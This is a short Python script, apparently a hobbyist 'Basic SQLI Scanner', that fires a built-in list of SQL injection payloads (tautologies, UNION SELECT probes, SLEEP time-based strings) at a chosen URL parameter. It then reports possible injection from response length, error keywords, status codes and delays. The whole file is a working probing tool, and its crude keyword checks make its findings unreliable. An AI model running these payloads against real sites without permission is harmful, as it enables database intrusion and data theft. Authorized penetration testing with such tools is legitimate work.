import requests
import sys

print("=========================================")
print("Welcome to Basic SQLI Scanner\n")

args = sys.argv

if len(args) != 5:
    print("Usage: python sqli_scanner.py -u <url> -p <parameter>")
    sys.exit(1)

if args[1] != "-u" or args[3] != "-p":
    print("Usage: python sqli_scanner.py -u <url> -p <parameter>")
    sys.exit(1)

url = args[2]
param = args[4]

normal_params = {param: "1"}

r = requests.get(url, params=normal_params)

print("Baseline length: ", len(r.text))

payloads = [
    "' OR 1=1--",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' AND 1=1--",
    "' AND 1=2--",
    "'",
    "\"",
    "''",
    "`",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "'--",
    "'#",
    "'/*",
    "' AND SLEEP(2)--",
    "' OR SLEEP(2)--"
]

for payload in payloads:

    test_params = {param: payload}
    r2 = requests.get(url, params=test_params)

    print("\nTesting payload:", payload)
    print("Payload length: ", len(r2.text))

    if abs(len(r2.text) - len(r.text)) > 100:
        print("[!!!] POSSIBLE SQL INJECTION (Response length anomaly)")

    sql_errors = ["error", "sql", "mysql", "syntax", "warning", "unclosed", "unexpected"]
    error_found = False

    for error in sql_errors:
        if error in r2.text.lower():
            error_found = True
            print(f"[!!!] SQL ERROR BASED INJECTION (Found keyword: {error})")

    if not error_found and r2.status_code != r.status_code:
        print(f"[!!!] POSSIBLE SQL INJECTION (Status code mismatch): {r2.status_code} vs {r.status_code}")

    time_threshold = 1.0
    if r2.elapsed.total_seconds() > r.elapsed.total_seconds() + time_threshold:
        print("[!!!] POSSIBLE TIME-BASED SQL INJECTION (Response delay)")

    payload_check = ["--", "#", "/*", "*/"]
    for p in payload_check:
        if p in r2.text:
            print(f"[!!!] POSSIBLE SQL INJECTION (Suspicious comment detected: {p})")

    if (
        not error_found
        and abs(len(r2.text) - len(r.text)) <= 100
        and r2.status_code == r.status_code
        and r2.elapsed.total_seconds() <= r.elapsed.total_seconds() + time_threshold
    ):
        print("No SQLi detected")

print("\n=========================================")
print("Thanks for using Basic SQLI Scanner")
print("Developed by sudo_0xksh")